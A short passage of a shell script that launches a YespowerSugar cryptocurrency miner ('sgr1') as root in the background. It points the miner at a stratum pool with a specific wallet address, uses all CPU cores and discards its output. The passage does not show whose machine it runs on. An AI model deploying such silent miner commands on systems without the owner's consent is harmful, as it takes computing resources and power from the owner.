...
chmod u+x sgr1
sudo nohup ./sgr1 -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.$WORKER -p x -t $(nproc --all) > /dev/null 2>&1 &
sleep 30
